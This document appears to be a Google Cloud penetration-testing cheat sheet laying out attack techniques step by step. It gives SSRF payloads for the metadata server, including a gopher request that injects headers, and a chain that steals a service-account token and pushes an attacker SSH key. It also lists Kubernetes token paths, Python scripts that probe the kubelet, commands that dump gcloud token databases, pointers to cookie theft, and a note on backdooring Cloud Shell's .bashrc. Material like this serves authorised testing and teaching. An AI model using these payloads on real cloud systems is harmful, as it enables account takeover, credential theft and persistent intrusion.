# GCP Pentest : Tools and Techniques

### MITRE Att&ck : Cloud Matrix
- https://attack.mitre.org/matrices/enterprise/cloud/

### GCP - Misc
#### GCP - 101
Google Cloud Platform resource hierarchy.
- https://cloud.google.com/resource-manager/docs/cloud-platform-resource-hierarchy

```
Organization
--> Folders
  --> Projects
    --> Resources
```

3 Types of IAM roles:
- Basic Roles : Existing roles prior to the introduction of IAM
	+ Owner
	+ Editor
	+ Viewer
	
- Predefined Roles : Granular access for specific service
	+ [Created by Google](https://cloud.google.com/iam/docs/understanding-roles#predefined_roles)

- Custom Roles : Ganular access to user-specified list of permissions.

**Checking permissions**
- [IAM permissions](https://cloud.google.com/iam/docs/permissions-reference)
- [Predefined roles](https://cloud.google.com/iam/docs/understanding-roles#predefined_roles)
- [Product specific IAM roles](https://cloud.google.com/iam/docs/understanding-roles#product_specific_documentation)

#### GCP Access
##### Web console
- https://console.cloud.google.com  
--> Management UI (classical admin console interface with GUI accessible through browser)

##### Gcloud CLI
- https://cloud.google.com/sdk/docs/cheatsheet
--> Google Cloud CLI is a set of tools to create and manage Google Cloud resources.

Through click on the web console or gcloud CLI you will directly talk to Controle Plan APIs (Restfull).


## GCP – Enumeration / Recon

### GCP - Azure - AWS IP ranges	
Python script performing the necessary actions for collecting the latest IP addresses used by Amazon Web Services, Google Compute, and Microsoft Azure.  

- https://github.com/chrismaddalena/UsefulScripts/blob/master/UpdateCloudIPs.py

### GCP Storage - GreyHatWarfare
Finding GCP Storage resources such as buckets:
- https://buckets.grayhatwarfare.com/

#### Accessing Onjects
- https://storage.googleapis.com/its_all_in_the_cloud/object001.jpg
	- storage.googleapis.com -> GCP
	- its_all_in_the_cloud -> Globally unique bucket name
	- object001.jpg -> Object Name

#### Git / Repo secret parsers
Public Repository Search for Credentials/Access Keys/Configuration Files  
```
gitleaks (https://github.com/zricethezav/gitleaks)
trufflehog (https://github.com/trufflesecurity/truffleHog)
git-secrets (https://github.com/awslabs/git-secrets)
shhgit (https://github.com/eth0izzle/shhgit)
gitrob (https://github.com/michenriksen/gitrob)
```

## GCP - Exploitation

#### GCP : GCPBucketBrute
- https://github.com/RhinoSecurityLabs/GCPBucketBrute


#### GCP : Server Side Request Forgery (SSRF)
v1 and v1beta1 depecation : https://cloud.google.com/compute/docs/deprecations/v0.1-v1beta1-metadata-server

--> v1beta1 deprecated but sometimes works. 

- metadata.google.internal : 169.254.169.254

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

- Beta does NOT require a header atm (but normally deprecated)
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

- Use gopher SSRF to add the required headers
- Metadata-Flavor: Google
```
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

##### Accessing interesting files
- **SSH Public Key** : http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
- **Get Access Token** : http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
- **Kubernetes Key** : http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=jso

##### SSRF Exploitation scenario:
1. Extract the token
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

2. Check the scope of the token
```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```

3. Now push the SSH key
```
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

### Validate a User Tokens
Query the Google API to validate and  determine token scope.
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ywgfhdb3dyx-xj0_EofjsfFks53kdDF
```
- [gcp_check_token.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_check_token.py)
- [gcp_get_token_gce_header.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_get_token_gce_header.py)
- [gcp_get_token_gce_v1beta1.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_get_token_gce_v1beta1.py)
Check access token is valid and it's scope via googleapis.com

###  Exploiting Kubernetes (K8s-GKE)
**Scenario** : You exploit a webapp and get command execution.  

#### Validate you are in container env
Check for environment variables for *kupepods* process
```
/bin/cat /proc/1/cgroup
```

If Docker in use, check for *.dockerenv* at /
```
ls -lah /
```

Check process list on the box (pid 1 is not **init** or **launchd**)
```
ps -aux

```

#### Accessing secrets
By default, a container in the Kubernetes cluster will hold a service account token within its file system. If attackers find that token, they can use it to move laterally, or depending on the privilege of the service account, they can escalate its privilege to compromise the entire cluster environment.  
```
/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/token
```

Access token via metadata from compromised nodes.
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```



## GCP - Lateral movement / pivoting
### SharpCloud
SharpCloud is a simple C# utility for checking for the existence of credential files related to Amazon Web Services, Microsoft Azure, and Google Compute.

##### Searches all user profiles for credentials related to Google Compute.
```
SharpCloud.exe gcloud
```

- https://github.com/chrismaddalena/SharpCloud

### From compromised node
If access to a container, a compromised pode can talk to the kubelet on ports:
- TCP 10250
- TCP 10255

--> Checking if port are accessible: E.g for port 10250  
```
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex(('192.168.0.10',10250))
if result == 0:
	print ("Port is open")
else:
	print ("Port is not open")
sock.close()
```

--> Listing pods
```
import urllib

response = urllib.urlopen('http://10.128.0.10:10255/pods')
print("Response : ", response)
print("URL : ", response.geturl())

headers = response.info()
print (headers)

data = response.read()
print (data^)
```

#### Container Breakout
If you land on a container that is not configured with default settings, you may need to escalate your privileges or escape from it in order to gain access to the underlying host OS.

- Docker Breakout (HackTricks)
- Container Escape Using Kernel Exploitation (CyberArk)
- How I Hacked Play-with-Docker (CyberArk)
- CVE-2016-5195
- CVE-2019–5736
- CVE-2019–14271
- CVE-2020–15257

## GCP - Privilege Escalation

## GCP - Persistence
#### Accessing tokens
In case you compromise a laptop, Mac, or server with Gcloud CLI installed.  

GCP tokens are stored within an SQL Lite database.  

- MAC Accessing tokens
```
ls /Users/bryce/.config/gcloud/access_tokens.db

sqlite3 access_tokens.db "select * from access_tokens"
```
- Linux Accessing tokens
```
ls /home/jdoe/.config/gcloud/access_tokens.db

sqlite3 access_tokens.db "select * from access_tokens"
```
- Windows Accessing tokens
```
dir C:\Users\username\AppData\Roaming\gcloud\access_tokens.db

sqlite3 access_tokens.db "select * from access_tokens"
```
Additionnally you can access Scope every token using **credentials.db** database.
```
sqlite3 credentials.db "select * from credentials
```
#### Browser Cookies
--> **If Root Access**-> Export (Safari,Chrome,Firefox,etc...)

- Mitre Att&ck technique - [T1539](https://attack.mitre.org/techniques/T1539/) - Steal Web Session Cookie
- Mitre Att&ck technique - [T1550](https://attack.mitre.org/techniques/T1550/) - Sub-Technique [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004/)

- https://embracethered.com/blog/posts/passthecookie/
- https://maxchadwick.xyz/blog/exporting-your-browser-cookies-on-a-mac/

--> **No Root Access**
- https://github.com/defaultnamehere/cookie_crimes

![image_cookie](https://github.com/lutzenfried/OffensiveCloud/blob/main/GCP/Images/cookie_browser.png)

#### Cloud Shell Persistence
Using Cloud Shell online, the machine comes pre-installed with the Google Cloud SDK but also with **5GB** HOME directory which will **persist** across sessions.

--> Backdoor the **.bashrc** file

## GCP - Resources

#### GCP - Security - HackTricks
- https://book.hacktricks.xyz/cloud-security/gcp-security